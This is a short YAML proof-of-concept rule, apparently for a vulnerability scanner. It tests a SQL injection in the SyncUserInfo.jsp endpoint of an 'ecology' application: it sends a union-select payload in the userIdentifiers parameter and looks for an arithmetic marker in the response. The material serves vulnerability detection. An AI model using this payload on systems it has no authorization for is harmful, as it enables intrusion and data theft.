name: poc-yaml-ecology-syncuserinf-sqli
rules:
  - method: GET
    path: >-
      /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(12333*100),null
    follow_redirects: true
    expression: |
      status==200 && body.bcontains(b'1233300')
detail:
  author: MaxSecurity(https://github.com/MaxSecurity)
  links:
    - https://github.com/MaxSecurity
